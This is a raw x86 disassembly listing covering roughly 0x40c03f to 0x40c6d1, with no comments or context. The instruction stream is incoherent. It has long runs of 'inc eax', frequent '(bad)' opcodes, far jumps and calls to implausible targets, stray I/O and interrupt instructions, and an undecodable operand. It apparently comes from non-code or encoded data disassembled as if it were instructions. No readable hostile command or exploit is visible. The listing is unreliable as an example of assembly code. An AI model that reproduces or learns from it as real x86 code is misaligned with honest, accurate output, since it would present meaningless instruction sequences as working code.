  40c03f:	push   ds
  40c040:	cs jle 0x40c051
  40c043:	(bad)
  40c046:	inc    eax
  40c047:	inc    eax
  40c048:	inc    eax
  40c049:	inc    eax
  40c04a:	inc    eax
  40c04b:	inc    eax
  40c04c:	inc    eax
  40c04d:	inc    eax
  40c04e:	inc    eax
  40c04f:	inc    eax
  40c050:	leave  
  40c051:	mov    ah,0x1b
  40c053:	rol    DWORD PTR [eax+0x7d],0x78
  40c057:	(bad)  
  40c058:	out    dx,eax
  40c059:	inc    ecx
  40c05a:	repnz push esp
  40c05c:	or     DWORD PTR [esi+0x3d],edi
  40c05f:	and    DWORD PTR [ebp-0x52],0x5546c148
  40c066:	dec    edi
  40c067:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c068:	push   edx
  40c069:	sbb    BYTE PTR [esp-0x30],bh
  40c06d:	outs   dx,BYTE PTR ds:[esi]
  40c06e:	mov    esp,0x40404040
  40c073:	inc    eax
  40c074:	inc    eax
  40c075:	int3   
  40c076:	jne    0x40c0b8
  40c078:	test   al,0x5
  40c07a:	jle    0x40c0bf
  40c07c:	les    ecx,FWORD PTR ds:0xc902a8a8
  40c082:	and    eax,0x52406d2e
  40c087:	adc    edi,ecx
  40c089:	xchg   esp,eax
  40c08a:	inc    ebx
  40c08b:	sub    eax,0x41231fee
  40c090:	bound  eax,QWORD PTR ds:0x4047caf4
  40c096:	mov    al,ds:0x40c10040
  40c09b:	inc    eax
  40c09c:	inc    eax
  40c09d:	inc    eax
  40c09e:	add    BYTE PTR [eax-0x1e],al
  40c0a1:	es leave 
  40c0a3:	or     ebx,DWORD PTR ds:0x6c6ed0c0
  40c0a9:	xor    eax,0x23e32490
  40c0ae:	push   ecx
  40c0af:	inc    eax
  40c0b0:	inc    eax
  40c0b1:	inc    eax
  40c0b2:	inc    eax
  40c0b3:	inc    eax
  40c0b4:	inc    eax
  40c0b5:	inc    eax
  40c0b6:	inc    eax
  40c0b7:	inc    DWORD PTR [eax-0x58]
  40c0ba:	(bad)  
  40c0bb:	rol    BYTE PTR ds:0x34e1fa8,0x52
  40c0c2:	mov    esp,0x6a12c97a
  40c0c7:	les    esp,FWORD PTR [eax-0x33]
  40c0ca:	add    eax,0xe3418063
  40c0cf:	test   eax,0x404040d0
  40c0d4:	inc    eax
  40c0d5:	inc    eax
  40c0d6:	inc    eax
  40c0d7:	inc    eax
  40c0d8:	inc    eax
  40c0d9:	inc    eax
  40c0da:	inc    eax
  40c0db:	sub    eax,0x45739243
  40c0e0:	fwait
  40c0e1:	jno    0x40c0f9
  40c0e3:	inc    ebp
  40c0e4:	sti    
  40c0e5:	mov    edi,0x40402047
  40c0ea:	inc    eax
  40c0eb:	inc    eax
  40c0ec:	inc    eax
  40c0ed:	inc    eax
  40c0ee:	inc    eax
  40c0ef:	inc    eax
  40c0f0:	add    BYTE PTR [esi+0x73642ec0],dl
  40c0f6:	add    dl,BYTE PTR [edi]
  40c0f8:	xor    eax,0x5650312a
  40c0fd:	bound  ecx,QWORD PTR [edx+0x74]
  40c100:	lock lahf 
  40c102:	inc    ebp
  40c103:	add    eax,0x6362ac2c
  40c108:	jns    0x40c153
  40c10a:	inc    eax
  40c10b:	dec    eax
  40c10c:	loopne 0x40c0fa
  40c10e:	add    ax,0xdd62
  40c112:	and    al,0xd0
  40c114:	pop    edx
  40c115:	inc    eax
  40c116:	inc    eax
  40c117:	inc    eax
  40c118:	inc    eax
  40c119:	inc    eax
  40c11a:	inc    eax
  40c11b:	and    eax,0x41404040
  40c120:	xor    BYTE PTR [eax],ch
  40c122:	dec    ebp
  40c123:	pop    edi
  40c124:	jmp    0x4867:0x1763bd65
  40c12b:	aad    0xe7
  40c12d:	push   ebx
  40c12e:	pop    es
  40c12f:	sub    eax,0x5a6b7fff
  40c134:	inc    ecx
  40c135:	push   eax
  40c136:	in     al,0x44
  40c138:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c139:	push   esp
  40c13a:	push   esp
  40c13b:	dec    esi
  40c13c:	arpl   WORD PTR ds:0x62d66652,dx
  40c142:	sub    al,0xab
  40c144:	inc    eax
  40c145:	inc    eax
  40c146:	inc    eax
  40c147:	inc    eax
  40c148:	inc    eax
  40c149:	inc    eax
  40c14a:	inc    eax
  40c14b:	inc    eax
  40c14c:	inc    eax
  40c14d:	inc    eax
  40c14e:	inc    esi
  40c14f:	jno    0x40c126
  40c151:	lods   al,BYTE PTR ds:[esi]
  40c152:	inc    ebx
  40c153:	(bad)  
  40c154:	shr    edi,1
  40c156:	xor    edx,DWORD PTR [edx+0x37]
  40c159:	add    eax,0x5d924f2a
  40c15e:	push   ecx
  40c15f:	push   ecx
  40c160:	jmp    0x4081022e
  40c165:	inc    eax
  40c166:	inc    eax
  40c167:	inc    eax
  40c168:	rol    DWORD PTR [eax+0x40],0xd
  40c16c:	fs dec ebp
  40c16e:	and    eax,DWORD PTR [ebx-0x1f]
  40c171:	cli    
  40c172:	mov    ah,0xce
  40c174:	adc    BYTE PTR [edx+0x6f],cl
  40c177:	inc    ecx
  40c178:	mov    bl,0x7
  40c17a:	add    eax,0xf66b7b62
  40c17f:	inc    eax
  40c180:	inc    edx
  40c181:	fxch   st(3)
  40c183:	jae    0x40c1c7
  40c185:	and    eax,DWORD PTR [ebx]
  40c187:	xor    esi,DWORD PTR [ebp+0x52]
  40c18a:	inc    eax
  40c18b:	inc    eax
  40c18c:	add    BYTE PTR [eax+0x40],al
  40c18f:	inc    eax
  40c190:	inc    eax
  40c191:	inc    eax
  40c192:	inc    eax
  40c193:	mov    ah,0xc8
  40c195:	ds xor al,0xc5
  40c198:	addr16 jnp 0x40c168
  40c19b:	inc    esp
  40c19c:	bound  eax,QWORD PTR [ebp+ecx*1+0x37]
  40c1a0:	inc    ecx
  40c1a1:	cmc    
  40c1a2:	and    DWORD PTR [eax-0x19349dc4],ecx
  40c1a8:	push   ebx
  40c1a9:	dec    ebp
  40c1aa:	icebp  
  40c1ab:	mov    ah,0x94
  40c1ad:	jno    0x40c1ef
  40c1af:	inc    eax
  40c1b0:	inc    eax
  40c1b1:	inc    eax
  40c1b2:	inc    eax
  40c1b3:	inc    eax
  40c1b4:	inc    eax
  40c1b5:	inc    eax
  40c1b6:	inc    eax
  40c1b7:	inc    eax
  40c1b8:	inc    eax
  40c1b9:	mov    ds:0x62f95340,eax
  40c1be:	(bad)  
  40c1bf:	aam    0xd2
  40c1c1:	mov    ah,0x9b
  40c1c3:	dec    ecx
  40c1c4:	pop    es
  40c1c5:	imul   ecx,DWORD PTR [eax+0x21fc69cb],0xffffff93
  40c1cc:	fst    DWORD PTR [eax+0x5a]
  40c1cf:	mov    esp,0x181d6881
  40c1d4:	push   edx
  40c1d5:	xchg   edi,eax
  40c1d6:	test   eax,0x444e4d41
  40c1db:	inc    eax
  40c1dc:	inc    eax
  40c1dd:	inc    eax
  40c1de:	inc    eax
  40c1df:	inc    eax
  40c1e0:	inc    eax
  40c1e1:	int3   
  40c1e2:	jne    0x40c224
  40c1e4:	xchg   ebp,eax
  40c1e5:	lds    ebp,FWORD PTR [esi-0x4c]
  40c1e8:	in     al,0x49
  40c1ea:	mov    al,0x2c
  40c1ec:	aas    
  40c1ed:	pop    es
  40c1ee:	(bad)  
  40c1ef:	fisub  DWORD PTR [edi+eiz*2]
  40c1f2:	fwait
  40c1f3:	dec    ecx
  40c1f4:	pop    esp
  40c1f5:	inc    eax
  40c1f6:	add    cl,al
  40c1f8:	inc    eax
  40c1f9:	inc    eax
  40c1fa:	inc    eax
  40c1fb:	inc    eax
  40c1fc:	add    BYTE PTR [eax+0x3d],al
  40c1ff:	inc    ecx
  40c200:	and    BYTE PTR [edi],0xb8
  40c203:	int3   
  40c204:	inc    eax
  40c205:	xor    DWORD PTR [ebp+0x20],esp
  40c208:	push   edi
  40c209:	stos   DWORD PTR es:[edi],eax
  40c20a:	adc    BYTE PTR [ebx+0x40404040],cl
  40c210:	inc    eax
  40c211:	inc    eax
  40c212:	inc    eax
  40c213:	inc    eax
  40c214:	inc    DWORD PTR [eax+0x34]
  40c217:	das    
  40c218:	pop    es
  40c219:	mov    ah,0xdd
  40c21b:	test   al,0xc
  40c21d:	pop    edi
  40c21e:	pop    ds
  40c21f:	xchg   ecx,eax
  40c220:	fadd   DWORD PTR ds:0x3bc946b4
  40c226:	inc    edx
  40c227:	inc    ecx
  40c228:	push   edx
  40c229:	xchg   DWORD PTR [eax+eax*2+0x40],esp
  40c22d:	inc    eax
  40c22e:	inc    eax
  40c22f:	inc    eax
  40c230:	inc    eax
  40c231:	inc    eax
  40c232:	inc    eax
  40c233:	inc    eax
  40c234:	inc    eax
  40c235:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c236:	xor    BYTE PTR es:[ecx+edx*4],ah
  40c23a:	aad    0x49
  40c23c:	dec    ebx
  40c23d:	inc    edx
  40c23e:	mov    eax,0x701575c
  40c243:	or     BYTE PTR ss:[eax],0x5
  40c247:	inc    eax
  40c248:	inc    eax
  40c249:	inc    eax
  40c24a:	inc    eax
  40c24b:	inc    eax
  40c24c:	inc    eax
  40c24d:	inc    eax
  40c24e:	inc    eax
  40c24f:	add    BYTE PTR [edi+0x41],dh
  40c252:	rcl    DWORD PTR [ecx-0x3413bbbe],cl
  40c258:	pop    ds
  40c259:	adc    eax,0x50d664c2
  40c25e:	bound  ebp,QWORD PTR [ebp+eax*1+0x24511549]
  40c265:	(bad)  
  40c267:	adc    eax,0x404040aa
  40c26c:	inc    eax
  40c26d:	inc    eax
  40c26e:	inc    eax
  40c26f:	and    eax,0x40404040
  40c274:	out    0x3c,eax
  40c276:	mov    ecx,0xadcbd4fc
  40c27b:	daa    
  40c27c:	hlt    
  40c27d:	(bad)  
  40c27e:	rol    DWORD PTR [ebx+0x403f4852],0x24
  40c285:	int    0xbc
  40c287:	sbb    eax,0x4032d8c3
  40c28c:	inc    eax
  40c28d:	inc    eax
  40c28e:	inc    eax
  40c28f:	inc    eax
  40c290:	inc    eax
  40c291:	inc    eax
  40c292:	inc    eax
  40c293:	inc    eax
  40c294:	inc    eax
  40c295:	and    DWORD PTR [ebx-0x3a],ecx
  40c298:	or     eax,0x60344f54
  40c29d:	pop    ecx
  40c29e:	xor    edx,edx
  40c2a0:	imul   ebx,edx,0x44
  40c2a3:	arpl   WORD PTR [edx+eax*2],si
  40c2a6:	mov    ebp,0x11d75065
  40c2ab:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  40c2ad:	and    eax,0x560d074a
  40c2b2:	jnp    0x40c23c
  40c2b4:	xor    eax,0xcbd8521f
  40c2b9:	test   al,0x40
  40c2bb:	inc    eax
  40c2bc:	inc    eax
  40c2bd:	inc    eax
  40c2be:	inc    eax
  40c2bf:	inc    eax
  40c2c0:	rol    DWORD PTR [eax+0x40],0xb4
  40c2c4:	inc    edx
  40c2c5:	sub    BYTE PTR [ecx+0x29],al
  40c2c8:	push   edx
  40c2c9:	and    BYTE PTR [ecx+0x57ca3415],al
  40c2cf:	dec    esi
  40c2d0:	lds    esi,FWORD PTR [esi+eiz*1]
  40c2d3:	inc    esp
  40c2d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c2d5:	pop    ds
  40c2d6:	inc    eax
  40c2d7:	rol    edx,cl
  40c2d9:	push   eax
  40c2da:	add    DWORD PTR fs:[edi+ebp*8-0x35],esp
  40c2df:	ins    BYTE PTR es:[edi],dx
  40c2e0:	push   ebp
  40c2e1:	dec    eax
  40c2e2:	xor    BYTE PTR ss:[ecx],bh
  40c2e5:	inc    eax
  40c2e6:	inc    eax
  40c2e7:	add    BYTE PTR [eax+0x40],al
  40c2ea:	inc    eax
  40c2eb:	inc    eax
  40c2ec:	inc    eax
  40c2ed:	inc    eax
  40c2ee:	pop    es
  40c2ef:	cmp    esp,DWORD PTR cs:[ebp-0x9]
  40c2f3:	je     0x40c2c7
  40c2f5:	inc    esi
  40c2f6:	mul    BYTE PTR [ecx+0x6e]
  40c2f9:	pop    es
  40c2fa:	ins    BYTE PTR es:[edi],dx
  40c2fb:	inc    eax
  40c2fc:	inc    eax
  40c2fd:	inc    eax
  40c2fe:	inc    eax
  40c2ff:	inc    eax
  40c300:	inc    eax
  40c301:	inc    eax
  40c302:	inc    eax
  40c303:	inc    eax
  40c304:	inc    eax
  40c305:	(bad)  
  40c306:	lock cmp al,0x5d
  40c309:	inc    ecx
  40c30a:	jne    0x40c2e4
  40c30c:	arpl   WORD PTR [ecx],dx
  40c30e:	gs dec esp
  40c310:	repz cmp edx,DWORD PTR gs:[edx+0x3]
  40c315:	mov    al,ds:0x40262866
  40c31a:	push   ebx
  40c31b:	aad    0x84
  40c31d:	ins    DWORD PTR es:[edi],dx
  40c31e:	jo     0x40c360
  40c320:	call   0x6263:0xf72843ae
  40c327:	(bad)  
  40c328:	test   BYTE PTR [eax-0xf],0xf5
  40c32c:	inc    eax
  40c32d:	inc    eax
  40c32e:	inc    eax
  40c32f:	inc    eax
  40c330:	inc    eax
  40c331:	inc    eax
  40c332:	int3   
  40c333:	jne    0x40c375
  40c335:	and    al,0xa7
  40c337:	add    BYTE PTR [eax-0x79],ch
  40c33a:	and    DWORD PTR [edx-0x6],edi
  40c33d:	test   al,0x7c
  40c33f:	call   0xf1900ee2
  40c344:	pop    es
  40c345:	out    dx,eax
  40c346:	bound  esp,QWORD PTR [ebp+0x40]
  40c349:	add    cl,al
  40c34b:	inc    eax
  40c34c:	inc    eax
  40c34d:	inc    eax
  40c34e:	inc    eax
  40c34f:	add    BYTE PTR [eax-0x44],al
  40c352:	inc    edi
  40c353:	inc    eax
  40c354:	(bad)  
  40c355:	(bad)  ds:0x121dac15
  40c35b:	xor    BYTE PTR [eax],ah
  40c35d:	push   edx
  40c35e:	fs inc eax
  40c360:	adc    eax,0xb0226cc2
  40c365:	int    0xcb
  40c367:	inc    eax
  40c368:	inc    eax
  40c369:	inc    eax
  40c36a:	inc    eax
  40c36b:	inc    eax
  40c36c:	inc    eax
  40c36d:	inc    eax
  40c36e:	inc    eax
  40c36f:	inc    DWORD PTR [eax+0x4d]
  40c372:	leave  
  40c373:	inc    esi
  40c374:	xchg   ebx,eax
  40c375:	and    ah,BYTE PTR gs:[edx-0x7c]
  40c379:	sbb    BYTE PTR [si],ah
  40c37c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c37d:	inc    ecx
  40c37e:	pop    esi
  40c37f:	frstor [edx+0x38]
  40c382:	mov    bh,BYTE PTR [eax+0x64122d3d]
  40c388:	inc    eax
  40c389:	inc    eax
  40c38a:	inc    eax
  40c38b:	inc    eax
  40c38c:	inc    eax
  40c38d:	inc    eax
  40c38e:	inc    eax
  40c38f:	inc    eax
  40c390:	inc    eax
  40c391:	inc    eax
  40c392:	xchg   edx,eax
  40c393:	cmp    BYTE PTR [edx+0x1],al
  40c396:	rol    DWORD PTR [ecx+0x60],1
  40c399:	stc    
  40c39a:	push   eax
  40c39b:	loope  0x40c326
  40c39d:	adc    al,0xd
  40c39f:	pop    ebx
  40c3a0:	adc    eax,0x38cc2507
  40c3a5:	leave  
  40c3a6:	ret    
  40c3a7:	inc    edx
  40c3a8:	xlat   BYTE PTR ds:[ebx]
  40c3a9:	inc    eax
  40c3aa:	inc    eax
  40c3ab:	inc    eax
  40c3ac:	inc    eax
  40c3ad:	inc    eax
  40c3ae:	inc    eax
  40c3af:	inc    eax
  40c3b0:	inc    eax
  40c3b1:	add    cl,bl
  40c3b3:	rcl    BYTE PTR [edi+0x49],0x26
  40c3b7:	test   al,0x2c
  40c3b9:	xor    dl,BYTE PTR [edx-0x30]
  40c3bc:	pop    esi
  40c3bd:	xor    al,0xb8
  40c3bf:	jb     0x40c401
  40c3c1:	push   edx
  40c3c2:	lds    eax,FWORD PTR [eax+ecx*8+0x60]
  40c3c6:	or     eax,0x1a3329f6
  40c3cb:	xor    al,BYTE PTR [ebp+0x40404040]
  40c3d1:	inc    eax
  40c3d2:	inc    eax
  40c3d3:	and    eax,0xa1404040
  40c3d8:	inc    esp
  40c3d9:	retf   
  40c3da:	pusha  
  40c3db:	push   cs
  40c3dc:	inc    ebp
  40c3dd:	daa    
  40c3de:	pop    ecx
  40c3df:	ret    
  40c3e0:	out    0x3c,al
  40c3e2:	pop    ecx
  40c3e3:	aad    0x65
  40c3e5:	clc    
  40c3e6:	test   al,0x4c
  40c3e8:	hlt    
  40c3e9:	shl    DWORD PTR [eax+0x40404040],0x40
  40c3f0:	inc    eax
  40c3f1:	inc    eax
  40c3f2:	inc    eax
  40c3f3:	inc    eax
  40c3f4:	inc    eax
  40c3f5:	in     eax,dx
  40c3f6:	pop    es
  40c3f7:	lds    eax,FWORD PTR [eax]
  40c3f9:	or     eax,0x79402962
  40c3fe:	fadd   DWORD PTR [edi+edx*1-0x35]
  40c402:	xchg   edx,eax
  40c403:	in     al,dx
  40c404:	xor    edi,DWORD PTR [ebx+0x4562e052]
  40c40a:	jae    0x40c41b
  40c40c:	push   ecx
  40c40d:	inc    edx
  40c40e:	aad    0x50
  40c410:	shr    DWORD PTR [edx-0x6f],1
  40c413:	inc    eax
  40c414:	inc    eax
  40c415:	inc    eax
  40c416:	inc    eax
  40c417:	inc    eax
  40c418:	inc    eax
  40c419:	rol    DWORD PTR [eax+0x40],0x2a
  40c41d:	inc    eax
  40c41e:	shl    DWORD PTR [ebx+0x2c],1
  40c421:	adc    al,0x28
  40c423:	fs mov ecx,0x9c55516c
  40c429:	push   ebp
  40c42a:	stc    
  40c42b:	retf   
  40c42c:	push   ebx
  40c42d:	inc    eax
  40c42e:	xchg   edx,eax
  40c42f:	fs adc eax,0x12c89041
  40c435:	cmp    ah,BYTE PTR [edx]
  40c437:	cli    
  40c438:	in     al,0xc9
  40c43a:	arpl   bx,cx
  40c43c:	mov    ebx,0x4007664f
  40c441:	inc    eax
  40c442:	add    BYTE PTR [eax+0x40],al
  40c445:	inc    eax
  40c446:	inc    eax
  40c447:	inc    eax
  40c448:	inc    eax
  40c449:	mov    dl,0x58
  40c44b:	inc    ecx
  40c44c:	mov    edi,0xd95341d4
  40c451:	bound  ecx,QWORD PTR ds:0x438ebfde
  40c457:	adc    DWORD PTR [edx+0xe],edx
  40c45a:	inc    ecx
  40c45b:	lds    ebx,FWORD PTR [edi-0x3266bf0a]
  40c461:	inc    eax
  40c462:	dec    ecx
  40c463:	dec    edi
  40c464:	pop    esi
  40c465:	push   eax
  40c466:	arpl   WORD PTR [edx-0x3f],ax
  40c469:	bound  ecx,QWORD PTR [esp+eax*1+0x40404043]
  40c470:	inc    eax
  40c471:	inc    eax
  40c472:	inc    eax
  40c473:	inc    eax
  40c474:	inc    eax
  40c475:	inc    eax
  40c476:	inc    eax
  40c477:	xchg   edx,eax
  40c478:	xor    esi,ecx
  40c47a:	inc    ecx
  40c47b:	add    cl,0x2
  40c47e:	ret    
  40c47f:	mov    al,ds:0x565565f
  40c484:	test   al,0x7b
  40c486:	in     al,dx
  40c487:	xchg   esp,eax
  40c488:	inc    eax
  40c489:	jno    0x40c492
  40c48b:	xchg   DWORD PTR [edx],edx
  40c48d:	inc    eax
  40c48e:	inc    eax
  40c48f:	inc    eax
  40c490:	inc    eax
  40c491:	inc    eax
  40c492:	inc    eax
  40c493:	int3   
  40c494:	jne    0x40c4d6
  40c496:	pusha  
  40c497:	bound  eax,QWORD PTR [ecx]
  40c499:	ss scas eax,DWORD PTR es:[edi]
  40c49b:	fadd   st,st(7)
  40c49d:	dec    ecx
  40c49e:	add    BYTE PTR [ebp+eiz*8+0x1a],ah
  40c4a2:	dec    ecx
  40c4a3:	push   edx
  40c4a4:	imul   edx,DWORD PTR [ebx],0xffffffcb
  40c4a7:	sub    BYTE PTR [edi+0x620cd143],ah
  40c4ad:	push   edx
  40c4ae:	mov    esp,0x616ea448
  40c4b3:	mov    al,0x4b
  40c4b5:	leave  
  40c4b6:	dec    eax
  40c4b7:	sub    BYTE PTR [edi+0x40c10040],dl
  40c4bd:	inc    eax
  40c4be:	inc    eax
  40c4bf:	inc    eax
  40c4c0:	add    BYTE PTR [eax+0x40],al
  40c4c3:	jns    0x40c4cc
  40c4c5:	xor    BYTE PTR [esi-0x9],al
  40c4c8:	lods   al,BYTE PTR ds:[esi]
  40c4c9:	or     BYTE PTR [eax-0x4633272c],ch
  40c4cf:	and    al,0x5
  40c4d1:	mov    WORD PTR [edx-0x2d],?
  40c4d4:	push   edx
  40c4d5:	test   al,0x52
  40c4d7:	sub    cl,cl
  40c4d9:	mov    esi,0x40514a40
  40c4de:	inc    eax
  40c4df:	inc    eax
  40c4e0:	inc    eax
  40c4e1:	inc    eax
  40c4e2:	inc    eax
  40c4e3:	inc    eax
  40c4e4:	inc    eax
  40c4e5:	inc    DWORD PTR [eax+0x10]
  40c4e8:	inc    eax
  40c4e9:	jle    0x40c52d
  40c4eb:	mul    DWORD PTR [ebx]
  40c4ed:	pop    edi
  40c4ee:	mov    esp,0x44a81080
  40c4f3:	jmp    0x40c50f
  40c4f5:	inc    eax
  40c4f6:	inc    eax
  40c4f7:	inc    eax
  40c4f8:	inc    eax
  40c4f9:	inc    eax
  40c4fa:	inc    eax
  40c4fb:	inc    eax
  40c4fc:	inc    eax
  40c4fd:	inc    eax
  40c4fe:	inc    eax
  40c4ff:	inc    esp
  40c500:	pop    es
  40c501:	inc    ecx
  40c502:	imul   edi,DWORD PTR [eax+esi*8-0x27eeade8],0x6
  40c50a:	sub    cl,BYTE PTR ds:0x3f415622
  40c510:	push   edx
  40c511:	and    al,0xa8
  40c513:	leave  
  40c514:	inc    esp
  40c515:	xchg   esp,eax
  40c516:	pop    edx
  40c517:	icebp  
  40c518:	dec    eax
  40c519:	push   0x40404011
  40c51e:	inc    eax
  40c51f:	inc    eax
  40c520:	inc    eax
  40c521:	inc    eax
  40c522:	inc    eax
  40c523:	add    BYTE PTR [ebx-0x2f],al
  40c526:	xchg   BYTE PTR [eax+0x13],al
  40c529:	pushf  
  40c52a:	sbb    bh,BYTE PTR [edx+edi*2-0x4f9f3adb]
  40c531:	inc    esp
  40c532:	inc    ecx
  40c533:	inc    ecx
  40c534:	cmp    BYTE PTR [eax],ah
  40c536:	mov    dl,0x62
  40c538:	pusha  
  40c539:	sub    al,0x62
  40c53b:	inc    eax
  40c53c:	inc    eax
  40c53d:	inc    eax
  40c53e:	inc    eax
  40c53f:	inc    eax
  40c540:	inc    eax
  40c541:	and    eax,0xce404040
  40c546:	fs inc esi
  40c548:	jg     0x40c58c
  40c54a:	mov    esi,0xa8e4a5c2
  40c54f:	enter  0x2fc6,0xdb
  40c553:	imul   ecx,DWORD PTR [edx],0x1430541
  40c559:	pop    esi
  40c55a:	fst    DWORD PTR [ebp+0x40cb48f1]
  40c560:	inc    eax
  40c561:	inc    eax
  40c562:	inc    eax
  40c563:	inc    eax
  40c564:	inc    eax
  40c565:	inc    eax
  40c566:	inc    eax
  40c567:	inc    eax
  40c568:	inc    eax
  40c569:	cmp    BYTE PTR [ebp+0x664d7240],bh
  40c56f:	imul   esp,DWORD PTR [ecx],0x1634240d
  40c575:	sub    al,0x40
  40c577:	inc    eax
  40c578:	inc    eax
  40c579:	inc    eax
  40c57a:	inc    eax
  40c57b:	inc    eax
  40c57c:	rol    DWORD PTR [eax+0x40],0x43
  40c580:	aas    
  40c581:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c582:	xchg   esi,eax
  40c583:	pop    esi
  40c584:	add    dl,BYTE PTR ds:0x62a87cc0
  40c58a:	sbb    al,0xa7
  40c58c:	inc    eax
  40c58d:	outs   dx,BYTE PTR ds:[esi]
  40c58e:	sbb    DWORD PTR [ebx+0x11],esi
  40c591:	les    eax,FWORD PTR [eax+0x40]
  40c594:	add    BYTE PTR [eax+0x40],al
  40c597:	inc    eax
  40c598:	inc    eax
  40c599:	inc    eax
  40c59a:	inc    eax
  40c59b:	fidivr WORD PTR [ebx+0x955b95]
  40c5a1:	mov    esp,0x3598104f
  40c5a6:	dec    edx
  40c5a7:	inc    esp
  40c5a8:	pop    ecx
  40c5a9:	or     eax,0x662942f3
  40c5ae:	xchg   edi,eax
  40c5af:	sub    al,0xdd
  40c5b1:	inc    edx
  40c5b2:	sbb    al,BYTE PTR [esi]
  40c5b4:	mov    al,ds:0x863e4740
  40c5b9:	gs gs add al,0x40
  40c5bd:	inc    eax
  40c5be:	inc    eax
  40c5bf:	inc    eax
  40c5c0:	inc    eax
  40c5c1:	inc    eax
  40c5c2:	inc    eax
  40c5c3:	inc    eax
  40c5c4:	inc    eax
  40c5c5:	inc    eax
  40c5c6:	mov    esi,DWORD PTR [ebx+esi*8]
  40c5c9:	int    0x98
  40c5cb:	mov    BYTE PTR [eax],al
  40c5cd:	int    0xe
  40c5cf:	dec    esi
  40c5d0:	into   
  40c5d1:	emms   
  40c5d3:	(bad)  
  40c5d4:	les    eax,FWORD PTR [edx-0x32]
  40c5d7:	inc    eax
  40c5d8:	xchg   ecx,eax
  40c5d9:	call   0x2e18:0x41287490
  40c5e0:	jbe    0x40c636
  40c5e2:	(bad)  
  40c5e3:	sub    bh,bl
  40c5e5:	hlt    
  40c5e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c5e7:	inc    eax
  40c5e8:	rol    DWORD PTR [eax+0x40],cl
  40c5eb:	inc    eax
  40c5ec:	inc    eax
  40c5ed:	inc    eax
  40c5ee:	inc    eax
  40c5ef:	int3   
  40c5f0:	jne    0x40c632
  40c5f2:	arpl   WORD PTR [esi+edx*2],bp
  40c5f5:	test   al,0xc7
  40c5f7:	or     DWORD PTR [ecx],ebp
  40c5f9:	lahf   
  40c5fa:	pop    eax
  40c5fb:	mov    al,0x43
  40c5fd:	inc    ebp
  40c5fe:	test   al,0x40
  40c600:	add    cl,al
  40c602:	inc    eax
  40c603:	inc    eax
  40c604:	inc    eax
  40c605:	inc    eax
  40c606:	add    BYTE PTR [eax-0x53],al
  40c609:	dec    esi
  40c60a:	push   esi
  40c60b:	push   edx
  40c60c:	and    al,0x23
  40c60e:	sub    dl,BYTE PTR [edx]
  40c610:	push   ds
  40c611:	inc    eax
  40c612:	jae    0x40c650
  40c614:	sbb    eax,0xcab816be
  40c619:	adc    DWORD PTR [eax-0x3b],ecx
  40c61c:	arpl   WORD PTR [edx],ax
  40c61e:	inc    eax
  40c61f:	adc    eax,0x40404040
  40c624:	inc    eax
  40c625:	inc    eax
  40c626:	inc    eax
  40c627:	inc    eax
  40c628:	inc    DWORD PTR [eax-0x30]
  40c62b:	xor    esi,DWORD PTR [edx+0x60]
  40c62e:	dec    edi
  40c62f:	add    al,0x40
  40c631:	retf   
  40c632:	xor    al,0xd2
  40c634:	and    bh,dh
  40c636:	xor    al,0xf7
  40c638:	inc    ebx
  40c639:	mov    al,0x17
  40c63b:	inc    ecx
  40c63c:	dec    eax
  40c63d:	gs xchg ecx,eax
  40c63f:	dec    edi
  40c640:	inc    eax
  40c641:	retf   
  40c642:	fwait
  40c643:	bound  edx,QWORD PTR [eax+0x75]
  40c646:	dec    edx
  40c647:	inc    eax
  40c648:	inc    eax
  40c649:	inc    eax
  40c64a:	inc    eax
  40c64b:	inc    eax
  40c64c:	inc    eax
  40c64d:	inc    eax
  40c64e:	inc    eax
  40c64f:	inc    eax
  40c650:	inc    eax
  40c651:	inc    edx
  40c652:	inc    edi
  40c653:	inc    esp
  40c654:	push   0x42
  40c656:	daa    
  40c657:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c658:	gs nop
  40c65a:	inc    eax
  40c65b:	inc    esi
  40c65c:	stos   BYTE PTR es:[edi],al
  40c65d:	sub    DWORD PTR [esi+0x62],eax
  40c660:	xchg   ecx,eax
  40c661:	fadd   QWORD PTR [eax]
  40c663:	inc    edx
  40c664:	jae    0x40c6c8
  40c666:	adc    eax,0x53525bd5
  40c66b:	sub    al,0x40
  40c66d:	inc    eax
  40c66e:	inc    eax
  40c66f:	inc    eax
  40c670:	inc    eax
  40c671:	inc    eax
  40c672:	inc    eax
  40c673:	inc    eax
  40c674:	add    BYTE PTR [esi],cl
  40c676:	inc    eax
  40c677:	imul   ecx,DWORD PTR ds:0xd2607029,0xf57136c9
  40c681:	and    al,0x68
  40c683:	in     al,dx
  40c684:	aad    0x40
  40c686:	dec    esp
  40c687:	pop    esp
  40c688:	popa   
  40c689:	sbb    al,0x62
  40c68b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c68c:	pop    ebx
  40c68d:	inc    eax
  40c68e:	inc    eax
  40c68f:	sar    DWORD PTR [eax+0x40404bad],cl
  40c695:	inc    eax
  40c696:	inc    eax
  40c697:	inc    eax
  40c698:	inc    eax
  40c699:	and    eax,0x3c404040
  40c69e:	cs inc eax
  40c6a0:	and    edx,DWORD PTR [edi+0x628d6252]
  40c6a6:	call   0x3880f0b7
  40c6ab:	inc    eax
  40c6ac:	inc    eax
  40c6ad:	inc    eax
  40c6ae:	inc    eax
  40c6af:	inc    eax
  40c6b0:	inc    eax
  40c6b1:	inc    eax
  40c6b2:	inc    eax
  40c6b3:	inc    eax
  40c6b4:	inc    eax
  40c6b5:	push   eax
  40c6b6:	inc    esp
  40c6b7:	dec    ecx
  40c6b8:	hlt    
  40c6b9:	inc    eax
  40c6ba:	inc    eax
  40c6bb:	ror    ebp,cl
  40c6bd:	test   eax,0x1262c4d2
  40c6c2:	and    eax,0x6fa86635
  40c6c7:	in     al,dx
  40c6c8:	fwait
  40c6c9:	inc    eax
  40c6ca:	dec    esp
  40c6cb:	inc    eax
  40c6cc:	inc    eax
  40c6cd:	inc    eax
  40c6ce:	inc    eax
  40c6cf:	inc    eax
  40c6d0:	inc    eax
  40c6d1:	rol    DWORD PTR [eax+0x40],0x77
